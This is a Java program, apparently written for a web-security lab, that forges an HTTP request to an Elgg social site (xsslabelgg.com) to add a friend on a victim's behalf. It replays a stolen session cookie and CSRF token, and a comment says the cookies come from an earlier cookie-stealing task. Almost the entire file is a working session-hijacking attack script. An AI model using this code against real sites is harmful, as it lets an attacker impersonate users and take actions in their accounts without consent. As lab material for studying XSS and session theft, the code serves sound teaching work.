import java.io.*;
import java.net.*;

public class HTTPSimpleForge {
    public static void main(String[] args) throws IOException {
        try {
            int responseCode;
            InputStream responseIn=null;
            String requestDetails = "&__elgg_ts=1523234680&__elgg_token=c350392c025b08bd57749463f68ef2e2";
            // URL to be forged.
            URL url = new URL("http://www.xsslabelgg.com/action/friends/add?friend=42"+requestDetails);
            // URLConnection instance is created to further parameterize a
            // resource request past what the state members of URL instance
            // can represent.
            HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
            if (urlConn instanceof HttpURLConnection) {
                urlConn.setConnectTimeout(60000);
                urlConn.setReadTimeout(90000);
            }
            // addRequestProperty method is used to add HTTP Header Information.
            // Here we add User-Agent HTTP header to the forged HTTP packet.
            // Add other necessary HTTP Headers yourself. Cookies should be stolen
            // using the method in task3.
            urlConn.addRequestProperty("Host","www.xsslabelgg.com");
            urlConn.addRequestProperty("User-agent","Sun JDK 1.6");
            urlConn.addRequestProperty("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            urlConn.addRequestProperty("Accept-Language","zh-CN,en-US;q=0.7,en;q=0.3");
            urlConn.addRequestProperty("Accept-Encoding","gzip, deflate");
            urlConn.addRequestProperty("Referer","http://www.xsslabelgg.com/profile/alice");
            urlConn.addRequestProperty("Cookie","Elgg=hcr0r766effr7ot51eko3cv2s7");
            urlConn.addRequestProperty("Connection","keep-alive");
            urlConn.addRequestProperty("Upgrade-Insecure-Requests","1");
            //HTTP Post Data which includes the information to be sent to the server.
            String data = "";
            // DoOutput flag of URL Connection should be set to true
            // to send HTTP POST message.
            urlConn.setDoOutput(true);
            // OutputStreamWriter is used to write the HTTP POST data
            // to the url connection.
            OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
            wr.write(data);
            wr.flush();
            // HttpURLConnection a subclass of URLConnection is returned by
            // url.openConnection() since the url is an http request.
            if (urlConn instanceof HttpURLConnection) {
                HttpURLConnection httpConn = (HttpURLConnection) urlConn;
                // Contacts the web server and gets the status code from
                // HTTP Response message.
                responseCode = httpConn.getResponseCode();
                System.out.println("Response Code = " + responseCode);
                // HTTP status code HTTP_OK means the response was
                // received sucessfully.
                if (responseCode == HttpURLConnection.HTTP_OK)
                    // Get the input stream from url connection object.
                    responseIn = urlConn.getInputStream();
                // Create an instance for BufferedReader
                // to read the response line by line.
                BufferedReader buf_inp = new BufferedReader(
                        new InputStreamReader(responseIn));
                String inputLine;
                while((inputLine = buf_inp.readLine())!=null) {
                    System.out.println(inputLine);
                }
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
    }
}
